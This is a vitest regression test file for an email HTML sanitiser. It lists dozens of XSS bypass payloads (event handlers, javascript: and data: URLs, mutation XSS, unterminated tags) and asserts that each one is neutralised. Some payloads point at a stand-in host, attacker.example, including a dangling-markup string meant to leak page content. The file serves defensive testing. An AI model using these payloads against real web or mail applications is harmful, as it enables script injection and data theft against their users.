// src/lib/mailsec/html.test.ts — the bypasses, written down so they cannot come back.
//
// Every payload in the first block was run against the PREVIOUS sanitiser
// (src/lib/mail-product/blocks.ts) before this file existed. All but one came back clean, which is
// why that sanitiser is treated here as a good design with one fatal parser assumption rather than
// as something to throw away. The one that did not is `unterminated`: every regex in it requires a
// closing `>`, so a tag that never closes was copied to the output verbatim and completed by the
// application's own markup after `set:html` inserted it.
//
// THE INVARIANT AT THE END IS THE REAL TEST. Individual payloads are a list somebody has to keep
// complete forever — the thing this file actually asserts is structural: after sanitising, the only
// `<` characters in the output are ones the sanitiser emitted itself. A future payload nobody has
// thought of still cannot open a tag.
import { describe, it, expect } from 'vitest';
import { sanitizeEmailHtml, sanitizeEmailHtmlString, safeHref, safeSrc, htmlToPlainText, ORIGIN, ISOLATED } from './html';

/** Re-parse the output and collect every tag the browser would build from it. */
function tagsIn(html: string): string[] {
  return [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map((m) => m[1].toLowerCase());
}

/**
 * The structural invariant. Splits the output on the tags the sanitiser emits and asserts that
 * nothing between them contains a raw `<`. If a payload leaves a dangling bracket anywhere, this
 * fails whatever the payload was.
 */
function hasOnlyEmittedTags(html: string): boolean {
  const withoutTags = html.replace(/<\/?[a-zA-Z][a-zA-Z0-9]*(?:\s[^>]*)?\/?>/g, '');
  return !withoutTags.includes('<');
}

const FORBIDDEN_TAGS = new Set([
  'script', 'iframe', 'object', 'embed', 'svg', 'math', 'base', 'meta', 'form', 'input',
  'style', 'applet', 'link', 'frame', 'frameset', 'template', 'noscript',
]);

/**
 * WHY THIS IS NOT A REGEX OVER THE WHOLE OUTPUT, which is what it was first.
 *
 * The sanitiser turns a payload into TEXT, and text that reads `onerror=alert(1)` is inert — it is
 * a sentence, not a handler. A blanket `/\son[a-z]+=/` over the output flags exactly the cases the
 * sanitiser handled CORRECTLY, and an assertion that fires on correct behaviour is worse than no
 * assertion: it gets relaxed until it passes, and the relaxed version stops catching the real thing.
 *
 * So this looks at MEANING. It walks the tags the sanitiser actually emitted and asks the questions
 * that matter about each one — is this element forbidden, is any ATTRIBUTE NAME an event handler,
 * does any url attribute carry a script scheme — and separately asserts that no `<` survived
 * outside a tag the sanitiser wrote. Escaped text can say whatever it likes.
 */
function unsafeParts(html: string): string[] {
  const problems: string[] = [];
  if (!hasOnlyEmittedTags(html)) problems.push('a "<" survived outside an emitted tag');

  for (const tag of html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g)) {
    const name = tag[1].toLowerCase();
    if (FORBIDDEN_TAGS.has(name)) problems.push('emitted a <' + name + '> element');
    for (const attr of (tag[2] || '').matchAll(/([a-zA-Z][a-zA-Z0-9:_.-]*)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]*)))?/g)) {
      const an = attr[1].toLowerCase();
      const av = attr[2] ?? attr[3] ?? attr[4] ?? '';
      if (/^on/i.test(an)) problems.push('kept the event handler ' + an);
      if ((an === 'href' || an === 'src' || an === 'action' || an === 'formaction')
        && /^\s*(javascript|vbscript|data)\s*:/i.test(av)) problems.push('kept a ' + an + ' pointing at ' + av.split(':')[0]);
      if (an === 'style' && /(javascript\s*:|expression\s*\(|@import|-moz-binding|behaviou?r\s*:)/i.test(av)) {
        problems.push('kept an executable style');
      }
    }
  }
  return problems;
}

const XSS = [
  ['event handler',           '<img src=x onerror=alert(1)>'],
  ['event handler uppercase', '<IMG SRC=x ONERROR=alert(1)>'],
  ['slash separated',         '<img/src="x"onerror="alert(1)">'],
  ['space before equals',     '<img src="x" onerror ="alert(1)">'],
  ['newline in attributes',   '<img src=x\nonerror=alert(1)>'],
  ['javascript href',         '<a href="javascript:alert(1)">x</a>'],
  ['javascript mixed case',   '<a href="jAvAsCrIpT:alert(1)">x</a>'],
  ['javascript tab entity',   '<a href="java&#09;script:alert(1)">x</a>'],
  ['javascript entity j',     '<a href="&#106;avascript:alert(1)">x</a>'],
  ['javascript control char', '<a href="\u0001javascript:alert(1)">x</a>'],
  ['javascript leading ws',   '<a href="   javascript:alert(1)">x</a>'],
  ['data href',               '<a href="data:text/html,<script>alert(1)</script>">x</a>'],
  ['vbscript href',           '<a href="vbscript:msgbox(1)">x</a>'],
  ['svg onload',              '<svg onload=alert(1)></svg>'],
  ['svg with script',         '<svg><script>alert(1)</script></svg>'],
  ['math mglyph mutation',    '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>'],
  ['noscript breakout',       '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ['template',                '<template><img src=x onerror=alert(1)></template>'],
  ['textarea',                '<textarea><img src=x onerror=alert(1)></textarea>'],
  ['xmp',                     '<xmp><img src=x onerror=alert(1)></xmp>'],
  ['title attribute escape',  '<p title="</p><img src=x onerror=alert(1)>">'],
  ['script no close',         '<script>alert(1)'],
  ['nested script tags',      '<scr<script>ipt>alert(1)</script>'],
  ['iframe srcdoc',           '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['form with formaction',    '<form><input formaction="javascript:alert(1)"></form>'],
  ['base tag',                '<base href="//attacker.example/">'],
  ['meta refresh',            '<meta http-equiv="refresh" content="0;url=//attacker.example">'],
  ['style javascript url',    '<div style="background:url(javascript:alert(1))">x</div>'],
  ['style expression',        '<div style="width:expression(alert(1))">x</div>'],
  ['style import',            '<div style="@import url(//attacker.example)">x</div>'],
  ['style moz binding',       '<div style="-moz-binding:url(//attacker.example/x.xml)">x</div>'],
  ['style data url',          '<div style="background:url(data:image/svg+xml,<svg onload=alert(1)>)">x</div>'],
  ['conditional comment',     '<!--[if IE]><script>alert(1)</script><![endif]-->'],
  ['object tag',              '<object data="javascript:alert(1)"></object>'],
  ['embed tag',               '<embed src="javascript:alert(1)">'],
  ['applet tag',              '<applet code="Evil.class"></applet>'],
  ['doctype declaration',     '<!DOCTYPE html><p>x</p>'],
  ['cdata',                   '<![CDATA[<script>alert(1)</script>]]>'],
] as const;

// The family the previous sanitiser could not see: no closing bracket anywhere, so none of its
// regexes matched and the whole string was copied through to `set:html`.
const UNTERMINATED = [
  ['unterminated script',     'hello <script src="https://attacker.example/x.js"'],
  ['unterminated img quoted', 'hello <img src=x onerror="alert(document.domain)"'],
  ['unterminated img bare',   'hello <img src=x onerror=alert(1)'],
  ['unterminated svg',        'hello <svg onload="alert(1)"'],
  ['unterminated iframe',     'hello <iframe src="javascript:alert(1)"'],
  ['unterminated base',       'hello <base href="https://attacker.example/"'],
  ['unterminated anchor',     'click <a href="javascript:alert(1)"'],
  ['dangling markup exfil',   'hello <img src="https://attacker.example/?leak='],
  ['dangling form action',    'hello <form action="https://attacker.example" '],
  ['unterminated comment',    'hello <!-- swallow everything after me'],
  ['unclosed attribute quote','hello <img src="x onerror=alert(1)>'],
  ['bare less than',          'a < b and c > d'],
] as const;

describe('sanitizeEmailHtml — known bypasses', () => {
  for (const [name, payload] of XSS) {
    it('neutralises: ' + name, () => {
      const out = sanitizeEmailHtmlString(payload);
      expect(unsafeParts(out), name + ' -> ' + out).toEqual([]);
    });
  }
});

describe('sanitizeEmailHtml — the unterminated-tag family', () => {
  for (const [name, payload] of UNTERMINATED) {
    it('neutralises: ' + name, () => {
      const out = sanitizeEmailHtmlString(payload);
      expect(unsafeParts(out), name + ' -> ' + out).toEqual([]);
    });
  }

  it('the exact payload that reached set:html becomes text, not a script element', () => {
    const out = sanitizeEmailHtmlString('hello <script src="https://attacker.example/x.js"');
    expect(out).not.toContain('<script');
    expect(out).toContain('&lt;');
    // And the proof that the browser cannot finish the tag using the page: append the markup that
    // follows a message body in the real template and re-check.
    const asRendered = out + '</div><div class="mb-atts">';
    expect(tagsIn(asRendered)).toEqual(['div', 'div']);
  });

  it('an unfinished tag is reported, never silently dropped', () => {
    const r = sanitizeEmailHtml('hello <img src=x onerror=alert(1)');
    expect(r.clean).toBe(false);
    expect(r.removed.some((x) => x.kind === 'malformed')).toBe(true);
  });
});

describe('sanitizeEmailHtml — the structural guarantee', () => {
  it('never emits a < it did not write itself, over every payload in this file', () => {
    for (const [name, payload] of [...XSS, ...UNTERMINATED]) {
      const out = sanitizeEmailHtmlString(payload);
      expect(hasOnlyEmittedTags(out), name + ' -> ' + out).toBe(true);
    }
  });

  it('holds for a body made of nothing but broken brackets', () => {
    const out = sanitizeEmailHtmlString('<<<<<img src=x onerror=alert(1)<<<<');
    expect(unsafeParts(out)).toEqual([]);
  });

  it('holds when a quoted attribute value contains a closing bracket', () => {
    const out = sanitizeEmailHtmlString('<a href="https://ok.example/?a=1>2" title="x>y">link</a>');
    expect(hasOnlyEmittedTags(out)).toBe(true);
    expect(out).toContain('href="https://ok.example/?a=1&gt;2"');
  });
});

describe('sanitizeEmailHtml — keeps real messages readable', () => {
  it('preserves ordinary formatting', () => {
    const out = sanitizeEmailHtmlString('<p>Dear <strong>Priya</strong>,<br/>Please see <a href="https://edurankai.in/x">the brief</a>.</p>');
    expect(out).toContain('<strong>Priya</strong>');
    expect(out).toContain('<br />');
    expect(out).toContain('href="https://edurankai.in/x"');
  });

  it('adds rel and target to every link', () => {
    const out = sanitizeEmailHtmlString('<a href="https://ok.example">x</a>');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('rel="noopener noreferrer nofollow"');
  });

  it('keeps a table intact', () => {
    const out = sanitizeEmailHtmlString('<table cellpadding="4"><tr><td bgcolor="#eee">1</td></tr></table>');
    expect(tagsIn(out)).toEqual(['table', 'tr', 'td', 'td', 'tr', 'table']);
    expect(out).toContain('cellpadding="4"');
  });

  it('leaves an ampersand a sender typed alone rather than double-escaping it', () => {
    expect(sanitizeEmailHtmlString('<p>Terms &amp; conditions</p>')).toBe('<p>Terms &amp; conditions</p>');
  });

  it('keeps a remote image when remote resources are allowed', () => {
    expect(sanitizeEmailHtmlString('<img src="https://cdn.example/a.png">')).toContain('src="https://cdn.example/a.png"');
  });

  it('drops a remote image when they are not', () => {
    const out = sanitizeEmailHtmlString('<img src="https://cdn.example/a.png">', { allowRemoteResources: false });
    expect(out).not.toContain('cdn.example');
  });
});

describe('sanitizeEmailHtml — layout escape', () => {
  const overlay = '<a href="#" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999">covered</a>';

  it('refuses a full-page overlay when rendering inside our own origin', () => {
    const out = sanitizeEmailHtmlString(overlay, ORIGIN);
    expect(out).not.toMatch(/position\s*:\s*fixed/i);
  });

  it('allows it inside a sandboxed frame, where it cannot reach the application', () => {
    const out = sanitizeEmailHtmlString(overlay, ISOLATED);
    expect(out).toMatch(/position\s*:\s*fixed/i);
  });
});

describe('safeHref / safeSrc', () => {
  it('accepts the schemes a message legitimately uses', () => {
    expect(safeHref('https://edurankai.in')).toBe('https://edurankai.in');
    expect(safeHref('mailto:connect@edurankai.in')).toBe('mailto:connect@edurankai.in');
    expect(safeHref('tel:+911234567890')).toBe('tel:+911234567890');
    expect(safeHref('#section')).toBe('#section');
  });

  it('upgrades a bare domain rather than guessing at it', () => {
    expect(safeHref('edurankai.in/apply')).toBe('https://edurankai.in/apply');
  });

  it('refuses every script-bearing scheme, however it is spelled', () => {
    for (const bad of [
      'javascript:alert(1)', 'JaVaScRiPt:alert(1)', '\u0001javascript:alert(1)',
      '  javascript:alert(1)', 'java\tscript:alert(1)', '&#106;avascript:alert(1)',
      'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)', 'file:///etc/passwd',
    ]) {
      expect(safeHref(bad), bad).toBe('');
    }
  });

  it('refuses data: images outright', () => {
    expect(safeSrc('data:image/svg+xml,<svg onload=alert(1)>', true)).toBe('');
    expect(safeSrc('data:image/png;base64,iVBORw0KGgo=', true)).toBe('');
  });

  it('allows cid: so an inline attachment still resolves', () => {
    expect(safeSrc('cid:logo@edurankai', true)).toBe('cid:logo@edurankai');
  });
});

describe('htmlToPlainText', () => {
  it('is a readability helper and says so by not being safe', () => {
    // It strips tags; it does NOT neutralise an unfinished one. Asserted so nobody mistakes it for
    // a security control and reaches for it instead of the sanitiser.
    expect(htmlToPlainText('<p>Hello</p><p>World</p>')).toBe('Hello\n\nWorld');
    expect(htmlToPlainText('<script>alert(1)</script>Body')).toBe('Body');
  });

  it('turns block ends into line breaks', () => {
    expect(htmlToPlainText('a<br>b')).toBe('a\nb');
  });
});
